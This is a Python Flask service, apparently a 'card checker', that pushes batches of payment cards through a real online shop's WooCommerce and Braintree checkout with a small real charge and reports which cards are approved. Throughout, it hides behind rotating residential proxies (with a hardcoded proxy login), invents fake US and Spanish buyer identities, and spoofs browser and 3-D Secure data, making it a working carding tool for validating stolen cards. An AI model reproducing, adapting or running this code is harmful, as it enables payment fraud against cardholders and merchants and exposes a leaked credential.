import asyncio
import datetime
import re
import uuid
import base64
import json
from typing import List, Dict, Optional, Tuple
import httpx
from bs4 import BeautifulSoup, Tag
from fake_useragent import FakeUserAgent
from faker import Faker
from flask import Flask, request, jsonify
from flask_cors import CORS
import threading
import time
import logging

# Configurar logging
logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

app = Flask(__name__)
CORS(app)

# Sistema de proxys rotativos
class ProxyRotator:
    def __init__(self, proxy_list: List[str]):
        self.proxy_list = proxy_list
        self.current_index = 0
        self.failed_proxies = set()
        self.lock = threading.Lock()
        logger.info(f"Initialized ProxyRotator with {len(proxy_list)} proxies")
    
    def get_next_proxy(self) -> Optional[str]:
        with self.lock:
            if len(self.failed_proxies) >= len(self.proxy_list):
                self.failed_proxies.clear()
                logger.info("Reset all failed proxies")
            
            attempts = 0
            while attempts < len(self.proxy_list):
                proxy = self.proxy_list[self.current_index]
                self.current_index = (self.current_index + 1) % len(self.proxy_list)
                
                if proxy not in self.failed_proxies:
                    return proxy
                
                attempts += 1
            
            return None
    
    def mark_proxy_failed(self, proxy: str):
        if proxy:
            with self.lock:
                self.failed_proxies.add(proxy)
                logger.warning(f"Marked proxy as failed: {proxy}")
    
    def mark_proxy_success(self, proxy: str):
        if proxy:
            with self.lock:
                self.failed_proxies.discard(proxy)
                logger.info(f"Marked proxy as successful: {proxy}")

# Configuración de proxys
PROXY_LIST = [
    "socks5://vUdAfD9RPXV8j2dX-res-any:MtsnNTSFWKsZoxJ4@resi.legionproxy.io:9595",
]

proxy_rotator = ProxyRotator(PROXY_LIST)

def parse_card(card: str) -> Tuple[str, str, str, str]:
    """Parsea una tarjeta en formato: número|mes|año|cvv"""
    try:
        parts = card.strip().split('|')
        if len(parts) >= 4:
            return parts[0], parts[1], parts[2], parts[3]
        else:
            # Fallback: extraer números
            numbers = re.findall(r"\d+", card)
            if len(numbers) >= 4:
                return numbers[0], numbers[1], numbers[2], numbers[3]
            else:
                raise IndexError("Not enough card data")
    except (IndexError, ValueError):
        raise IndexError(
            "Card format is incorrect. Expected format: card_number|exp_month|exp_year|cvv"
        )

def extract_braintree_token(html_content: str) -> Optional[str]:
    """Extrae el token de Braintree del HTML y lo decodifica"""
    try:
        # Buscar múltiples patrones posibles
        patterns = [
            r'var wc_braintree_client_token = \["([^"]+)"\];',
            r'wc_braintree_client_token":\s*\["([^"]+)"\]',
            r'"braintree_client_token":\s*"([^"]+)"',
        ]
        
        for pattern in patterns:
            match = re.search(pattern, html_content)
            if match:
                encoded_token = match.group(1)
                break
        else:
            logger.error("No se encontró el token de Braintree en el HTML")
            return None
        
        try:
            decoded_bytes = base64.b64decode(encoded_token)
            decoded_token = decoded_bytes.decode('utf-8')
            token_data = json.loads(decoded_token)
            auth_fingerprint = token_data.get('authorizationFingerprint')
            
            if auth_fingerprint:
                logger.info("Token de autorización extraído exitosamente")
                return auth_fingerprint
            else:
                logger.error("No se encontró authorizationFingerprint en el token decodificado")
                return None
                
        except (base64.binascii.Error, json.JSONDecodeError, UnicodeDecodeError) as e:
            logger.error(f"Error al decodificar el token: {e}")
            return None
            
    except Exception as e:
        logger.error(f"Error al extraer el token de Braintree: {e}")
        return None

async def test_proxy_connection(proxy_url: str) -> bool:
    """Prueba la conexión del proxy"""
    try:
        proxies = {
            "http://": proxy_url,
            "https://": proxy_url
        }
        
        async with httpx.AsyncClient(
            proxies=proxies,
            timeout=15.0,
            verify=False
        ) as client:
            response = await client.get("https://httpbin.org/ip")
            if response.status_code == 200:
                ip_data = response.json()
                logger.info(f"Proxy working - IP: {ip_data.get('origin', 'unknown')}")
                return True
            else:
                logger.error(f"Proxy test failed - Status: {response.status_code}")
                return False
    except Exception as e:
        logger.error(f"Proxy test failed: {e}")
        return False

async def get_ip_address(proxy_url: str = None) -> str:
    """Obtiene la dirección IP actual"""
    try:
        client_config = {
            "timeout": 15.0,
            "verify": False,
            "follow_redirects": True
        }
        
        if proxy_url:
            client_config["proxies"] = {
                "http://": proxy_url,
                "https://": proxy_url
            }
        
        async with httpx.AsyncClient(**client_config) as client:
            response = await client.get(
                "https://api.ipify.org?format=json",
                headers={
                    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
                }
            )
            
            if response.status_code == 200:
                ip = response.json().get("ip", "")
                logger.info(f"Current IP: {ip}")
                return ip
            else:
                logger.error(f"Failed to get IP address: {response.status_code}")
                return ""
    except Exception as e:
        logger.error(f"Failed to get IP address: {e}")
        return ""

async def braintree_18_99_eur(card: str, use_proxy: bool = True) -> Optional[Tuple[str, str, str, str]]:
    """Función principal de verificación de tarjetas"""
    try:
        logger.info(f"Starting card verification: {card[:4]}****")
        card_number, exp_month, exp_year, cvv = parse_card(card)
        
        # Generar datos fake
        fake_us = Faker(locale="en_US")
        fake_es = Faker(locale="es_ES")
        
        # Datos US
        first_name = fake_us.first_name()
        last_name = fake_us.last_name()
        street_address = fake_us.street_address()
        city = fake_us.city()
        zip_code = fake_us.zipcode()
        phone = fake_us.numerify("###-###-####")
        email = fake_us.email()
        
        # Datos ES
        first_name_es = fake_es.first_name()
        last_name_es = fake_es.last_name()
        street_address_es = fake_es.street_address()
        city_es = "Barcelona"
        zip_code_es = fake_es.numerify("08###")
        
        # IDs únicos
        session_id = str(uuid.uuid4())
        reference_id = str(uuid.uuid4())
        start_time = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        
        # Headers realistas
        headers = {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
            "Accept-Language": "en-US,en;q=0.5",
            "Accept-Encoding": "gzip, deflate, br",
            "DNT": "1",
            "Connection": "keep-alive",
            "Upgrade-Insecure-Requests": "1",
        }
        
        # Configurar proxy
        proxy_url = None
        if use_proxy:
            proxy_url = proxy_rotator.get_next_proxy()
            if proxy_url:
                logger.info(f"Using proxy: {proxy_url}")
                if not await test_proxy_connection(proxy_url):
                    proxy_rotator.mark_proxy_failed(proxy_url)
                    proxy_url = None
                    logger.warning("Proxy failed test, continuing without proxy")
            else:
                logger.warning("No proxy available")
        
        # Obtener IP
        ip_address = await get_ip_address(proxy_url)
        if not ip_address:
            logger.warning("Could not get IP address, using fallback")
            ip_address = "127.0.0.1"
        
        # Configurar cliente HTTP
        client_config = {
            "timeout": 60.0,
            "verify": False,
            "follow_redirects": True,
            "headers": headers
        }
        
        if proxy_url:
            client_config["proxies"] = {
                "http://": proxy_url,
                "https://": proxy_url
            }
        
        async with httpx.AsyncClient(**client_config) as client:
            # PASO 1: Añadir al carrito
            logger.info("STEP 1: Adding to cart...")
            response = await client.post(
                "https://nammanmuay.eu/wp-admin/admin-ajax.php",
                headers={
                    "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
                    "X-Requested-With": "XMLHttpRequest",
                    "Origin": "https://nammanmuay.eu",
                    "Referer": "https://nammanmuay.eu/namman-muay-cream-100g/"
                },
                data={
                    "quantity": "1",
                    "add-to-cart": "623",
                    "action": "ouwoo_ajax_add_to_cart",
                    "variation_id": "0"
                }
            )
            
            if response.status_code != 200:
                logger.error(f"Step 1 failed: {response.status_code}")
                if proxy_url:
                    proxy_rotator.mark_proxy_failed(proxy_url)
                return None
            
            logger.info("Step 1 completed successfully")
            
            # PASO 2: Obtener página de checkout
            logger.info("STEP 2: Getting checkout page...")
            response = await client.get(
                "https://nammanmuay.eu/checkout/",
                headers={
                    "Referer": "https://nammanmuay.eu/namman-muay-cream-100g/"
                }
            )
            
            if response.status_code != 200:
                logger.error(f"Step 2 failed: {response.status_code}")
                if proxy_url:
                    proxy_rotator.mark_proxy_failed(proxy_url)
                return None
            
            # Extraer nonce y token
            soup = BeautifulSoup(response.text, "html.parser")
            
            nonce_input = soup.find("input", id="woocommerce-process-checkout-nonce")
            if not nonce_input:
                logger.error("Checkout nonce not found")
                return None
            
            checkout_nonce = nonce_input.get("value")
            logger.info("Checkout nonce extracted")
            
            auth_fingerprint = extract_braintree_token(response.text)
            if not auth_fingerprint:
                logger.error("Could not extract Braintree token")
                return None
            
            logger.info("Step 2 completed successfully")
            
            # PASO 3: Tokenizar tarjeta
            logger.info("STEP 3: Tokenizing credit card...")
            response = await client.post(
                "https://payments.braintree-api.com/graphql",
                headers={
                    "Authorization": f"Bearer {auth_fingerprint}",
                    "Braintree-Version": "2018-05-10",
                    "Content-Type": "application/json",
                    "Origin": "https://assets.braintreegateway.com",
                    "Referer": "https://assets.braintreegateway.com/"
                },
                json={
                    "clientSdkMetadata": {
                        "source": "client",
                        "integration": "custom",
                        "sessionId": session_id
                    },
                    "query": "mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) { tokenizeCreditCard(input: $input) { token creditCard { bin brandCode last4 cardholderName expirationMonth expirationYear binData { prepaid healthcare debit durbinRegulated commercial payroll issuingBank countryOfIssuance productId business consumer purchase corporate } } } }",
                    "variables": {
                        "input": {
                            "creditCard": {
                                "number": card_number,
                                "expirationMonth": exp_month.zfill(2),
                                "expirationYear": "20" + exp_year if len(exp_year) == 2 else exp_year,
                                "cvv": cvv,
                                "billingAddress": {
                                    "postalCode": zip_code,
                                    "streetAddress": street_address
                                }
                            },
                            "options": {"validate": False}
                        }
                    },
                    "operationName": "TokenizeCreditCard"
                }
            )
            
            if response.status_code != 200:
                logger.error(f"Step 3 failed: {response.status_code}")
                if proxy_url:
                    proxy_rotator.mark_proxy_failed(proxy_url)
                return None
            
            token_data = response.json()
            
            if 'errors' in token_data:
                error_msg = token_data['errors'][0].get('message', 'GraphQL error')
                logger.error(f"GraphQL error: {error_msg}")
                return "declined", error_msg, "unknown", "unknown"
            
            token = token_data.get("data", {}).get("tokenizeCreditCard", {}).get("token")
            if not token:
                logger.error("No token received")
                return None
            
            logger.info(f"Step 3 completed - Token: {token[:20]}...")
            
            # PASO 4: 3D Secure lookup
            logger.info("STEP 4: 3D Secure lookup...")
            response = await client.post(
                f"https://api.braintreegateway.com/merchants/vb72b9cm2v6gskzz/client_api/v1/payment_methods/{token}/three_d_secure/lookup",
                headers={
                    "Content-Type": "application/json",
                    "Origin": "https://nammanmuay.eu",
                    "Referer": "https://nammanmuay.eu/"
                },
                json={
                    "amount": "18.99",
                    "browserColorDepth": 24,
                    "browserJavaEnabled": False,
                    "browserJavascriptEnabled": True,
                    "browserLanguage": "en-US",
                    "browserScreenHeight": 1080,
                    "browserScreenWidth": 1920,
                    "browserTimeZone": 240,
                    "deviceChannel": "Browser",
                    "additionalInfo": {
                        "shippingGivenName": first_name,
                        "shippingSurname": last_name,
                        "ipAddress": ip_address,
                        "billingLine1": street_address,
                        "billingLine2": street_address,
                        "billingCity": city,
                        "billingState": "",
                        "billingPostalCode": zip_code,
                        "billingCountryCode": "US",
                        "billingPhoneNumber": phone,
                        "billingGivenName": first_name_es,
                        "billingSurname": last_name_es,
                        "shippingLine1": street_address_es,
                        "shippingLine2": street_address_es,
                        "shippingCity": city_es,
                        "shippingState": "",
                        "shippingPostalCode": zip_code_es,
                        "shippingCountryCode": "ES",
                        "email": email
                    },
                    "bin": card_number[:6],
                    "dfReferenceId": f"0_{reference_id}",
                    "clientMetadata": {
                        "requestedThreeDSecureVersion": "2",
                        "sdkVersion": "web/3.123.1",
                        "cardinalDeviceDataCollectionTimeElapsed": 1,
                        "issuerDeviceDataCollectionTimeElapsed": 569,
                        "issuerDeviceDataCollectionResult": True
                    },
                    "authorizationFingerprint": auth_fingerprint,
                    "braintreeLibraryVersion": "braintree/web/3.123.1",
                    "_meta": {
                        "merchantAppId": "nammanmuay.eu",
                        "platform": "web",
                        "sdkVersion": "3.123.1",
                        "source": "client",
                        "integration": "custom",
                        "integrationType": "custom",
                        "sessionId": session_id
                    }
                }
            )
            
            if response.status_code != 200:
                logger.error(f"Step 4 failed: {response.status_code}")
                if proxy_url:
                    proxy_rotator.mark_proxy_failed(proxy_url)
                return None
            
            tds_data = response.json()
            
            if 'error' in tds_data:
                error_msg = tds_data['error'].get('message', '3DS error')
                logger.error(f"3DS error: {error_msg}")
                return "declined", error_msg, "unknown", "unknown"
            
            nonce = tds_data.get("paymentMethod", {}).get("nonce")
            tds_status = tds_data.get("paymentMethod", {}).get("threeDSecureInfo", {}).get("status")
            enrolled = tds_data.get("paymentMethod", {}).get("threeDSecureInfo", {}).get("enrolled")
            
            if not nonce:
                logger.error("No nonce received from 3DS")
                return None
            
            logger.info(f"Step 4 completed - 3DS Status: {tds_status}, Enrolled: {enrolled}")
            
            # PASO 5: Crear carrito abandonado
            logger.info("STEP 5: Creating abandoned cart...")
            response = await client.post(
                "https://nammanmuay.eu/?wc-ajax=bwfan_insert_abandoned_cart&wfacp_id=54599&wfacp_is_checkout_override=yes",
                headers={
                    "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
                    "X-Requested-With": "XMLHttpRequest",
                    "Origin": "https://nammanmuay.eu",
                    "Referer": "https://nammanmuay.eu/checkout/"
                },
                data={
                    "email": email,
                    "action": "bwfan_insert_abandoned_cart",
                    "checkout_fields_data[billing_first_name]": first_name,
                    "checkout_fields_data[billing_last_name]": last_name,
                    "checkout_fields_data[billing_country]": "US",
                    "checkout_fields_data[billing_address_1]": street_address,
                    "checkout_fields_data[billing_city]": city,
                    "checkout_fields_data[billing_postcode]": zip_code,
                    "checkout_fields_data[billing_phone]": phone,
                    "checkout_fields_data[shipping_first_name]": first_name_es,
                    "checkout_fields_data[shipping_last_name]": last_name_es,
                    "checkout_fields_data[shipping_country]": "ES",
                    "checkout_fields_data[shipping_address_1]": street_address_es,
                    "checkout_fields_data[shipping_city]": city_es,
                    "checkout_fields_data[shipping_postcode]": zip_code_es,
                    "current_step": "single_step",
                    "current_page_id": "54599",
                    "timezone": "America/New_York",
                    "_wpnonce": "a8f2caf831"
                }
            )
            
            cart_id = None
            if response.status_code == 200:
                try:
                    cart_data = response.json()
                    cart_id = cart_data.get("id")
                    logger.info(f"Step 5 completed - Cart ID: {cart_id}")
                except:
                    logger.warning("Could not parse cart response, continuing...")
            
            # PASO 6: Checkout final
            logger.info("STEP 6: Final checkout...")
            
            checkout_data = {
                "_wfacp_post_id": "54599",
                "wfacp_cart_hash": "",
                "billing_email": email,
                "billing_first_name": first_name,
                "billing_last_name": last_name,
                "billing_address_1": street_address,
                "billing_country": "US",
                "billing_city": city,
                "billing_postcode": zip_code,
                "billing_phone": phone,
                "shipping_first_name": first_name_es,
                "shipping_last_name": last_name_es,
                "shipping_address_1": street_address_es,
                "shipping_country": "ES",
                "shipping_city": city_es,
                "shipping_postcode": zip_code_es,
                "shipping_method[0]": "flat_rate:53",
                "payment_method": "braintree_cc",
                "braintree_cc_nonce_key": nonce,
                "braintree_cc_device_data": json.dumps({"correlation_id": session_id}),
                "terms": "on",
                "woocommerce-process-checkout-nonce": checkout_nonce,
                "_wp_http_referer": "/?wc-ajax=update_order_review&wfacp_id=54599",
                "wc_order_attribution_source_type": "typein",
                "wc_order_attribution_utm_source": "(direct)",
                "wc_order_attribution_utm_medium": "(none)",
                "wc_order_attribution_session_start_time": start_time
            }
            
            if cart_id:
                checkout_data["bwfan_cart_id"] = str(cart_id)
            
            response = await client.post(
                "https://nammanmuay.eu/?wc-ajax=checkout&wfacp_id=54599&wfacp_is_checkout_override=yes",
                headers={
                    "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
                    "X-Requested-With": "XMLHttpRequest",
                    "Origin": "https://nammanmuay.eu",
                    "Referer": "https://nammanmuay.eu/checkout/"
                },
                data=checkout_data
            )
            
            if response.status_code != 200:
                logger.error(f"Step 6 failed: {response.status_code}")
                if proxy_url:
                    proxy_rotator.mark_proxy_failed(proxy_url)
                return None
            
            # Marcar proxy como exitoso
            if proxy_url:
                proxy_rotator.mark_proxy_success(proxy_url)
            
            # Procesar respuesta final
            try:
                result_data = response.json()
                if result_data.get("result") == "success":
                    logger.info("PAYMENT APPROVED!")
                    return "approved", "Charged 18,99€", tds_status, enrolled
                else:
                    # Extraer mensaje de error
                    messages = result_data.get("messages", "")
                    if messages:
                        soup = BeautifulSoup(messages, "html.parser")
                        error_text = soup.get_text().strip()
                        match = re.search(r"Reason:\s*(.*)", error_text)
                        error_reason = match.group(1) if match else error_text
                    else:
                        error_reason = "Payment declined"
                    
                    logger.info(f"PAYMENT DECLINED: {error_reason}")
                    return "declined", error_reason, tds_status, enrolled
                    
            except json.JSONDecodeError:
                # Si no es JSON, extraer texto
                soup = BeautifulSoup(response.text, "html.parser")
                error_text = soup.get_text().strip()
                error_reason = error_text[:200] if error_text else "Unknown error"
                logger.info(f"PAYMENT DECLINED: {error_reason}")
                return "declined", error_reason, tds_status, enrolled
            
    except Exception as e:
        logger.error(f"Card verification failed: {e}")
        return None

# API Routes
@app.route('/api/check-card', methods=['POST'])
def check_single_card():
    try:
        data = request.get_json()
        
        if not data or 'card' not in data:
            return jsonify({
                'error': 'Missing card data',
                'message': 'Please provide card in the request body'
            }), 400
        
        card = data['card']
        use_proxy = data.get('use_proxy', True)
        
        logger.info(f"API: Processing card {card[:4]}**** with proxy: {use_proxy}")
        
        # Ejecutar verificación
        loop = asyncio.new_event_loop()
        asyncio.set_event_loop(loop)
        
        try:
            result = loop.run_until_complete(braintree_18_99_eur(card, use_proxy))
        finally:
            loop.close()
        
        if result is None:
            return jsonify({
                'error': 'Verification failed',
                'message': 'Could not complete card verification'
            }), 500
        
        status, message, tds_status, enrolled = result
        
        return jsonify({
            'card': card,
            'status': status.upper(),
            'message': message,
            'tds_status': tds_status,
            'tds_enrolled': enrolled,
            'timestamp': datetime.datetime.now().isoformat()
        })
        
    except Exception as e:
        logger.error(f"API Error: {str(e)}")
        return jsonify({
            'error': 'Internal server error',
            'message': str(e)
        }), 500

@app.route('/api/check-cards', methods=['POST'])
def check_multiple_cards():
    try:
        data = request.get_json()
        
        if not data or 'cards' not in data:
            return jsonify({
                'error': 'Missing cards data',
                'message': 'Please provide cards array in the request body'
            }), 400
        
        cards = data['cards']
        use_proxy = data.get('use_proxy', True)
        
        if not isinstance(cards, list) or len(cards) == 0:
            return jsonify({
                'error': 'Invalid cards data',
                'message': 'Cards must be a non-empty array'
            }), 400
        
        results = []
        
        for i, card in enumerate(cards):
            logger.info(f"API: Processing card {i+1}/{len(cards)}: {card[:4]}****")
            
            loop = asyncio.new_event_loop()
            asyncio.set_event_loop(loop)
            
            try:
                result = loop.run_until_complete(braintree_18_99_eur(card, use_proxy))
            finally:
                loop.close()
            
            if result is None:
                card_result = {
                    'card': card,
                    'status': 'ERROR',
                    'message': 'Verification failed',
                    'tds_status': 'unknown',
                    'tds_enrolled': 'unknown',
                    'timestamp': datetime.datetime.now().isoformat()
                }
            else:
                status, message, tds_status, enrolled = result
                card_result = {
                    'card': card,
                    'status': status.upper(),
                    'message': message,
                    'tds_status': tds_status,
                    'tds_enrolled': enrolled,
                    'timestamp': datetime.datetime.now().isoformat()
                }
            
            results.append(card_result)
            
            # Pausa entre requests
            if i < len(cards) - 1:
                time.sleep(3)
        
        return jsonify({
            'total_cards': len(cards),
            'results': results,
            'timestamp': datetime.datetime.now().isoformat()
        })
        
    except Exception as e:
        logger.error(f"API Error: {str(e)}")
        return jsonify({
            'error': 'Internal server error',
            'message': str(e)
        }), 500

@app.route('/api/proxy-status', methods=['GET'])
def proxy_status():
    return jsonify({
        'total_proxies': len(proxy_rotator.proxy_list),
        'failed_proxies': len(proxy_rotator.failed_proxies),
        'active_proxies': len(proxy_rotator.proxy_list) - len(proxy_rotator.failed_proxies),
        'current_index': proxy_rotator.current_index
    })

@app.route('/api/health', methods=['GET'])
def health_check():
    return jsonify({
        'status': 'healthy',
        'timestamp': datetime.datetime.now().isoformat(),
        'proxy_system': 'active',
        'version': '2.0'
    })

if __name__ == '__main__':
    logger.info("Starting Braintree Card Checker API v2.0...")
    logger.info(f"Loaded {len(PROXY_LIST)} proxies")
    logger.info("Available endpoints:")
    logger.info("  - GET  /api/health")
    logger.info("  - GET  /api/proxy-status") 
    logger.info("  - POST /api/check-card")
    logger.info("  - POST /api/check-cards")
    app.run(host='0.0.0.0', port=5000, debug=False)
